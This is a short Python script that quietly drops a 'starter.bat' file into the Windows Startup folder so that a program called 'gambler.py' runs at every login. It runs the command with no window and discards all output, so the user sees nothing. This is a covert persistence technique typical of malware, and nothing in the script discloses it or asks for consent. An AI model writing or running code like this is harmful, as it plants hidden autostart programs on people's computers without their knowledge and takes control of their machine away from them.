import subprocess, os

#values goes here
full_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gambler.py")
path = os.path.dirname(os.path.abspath(__file__))
batch_startup_script = f"""
cmd /c "cd /d "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" && echo @echo off>starter.bat && echo python {full_path}>>starter.bat"
"""


#code goes here
subprocess.Popen(batch_startup_script, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
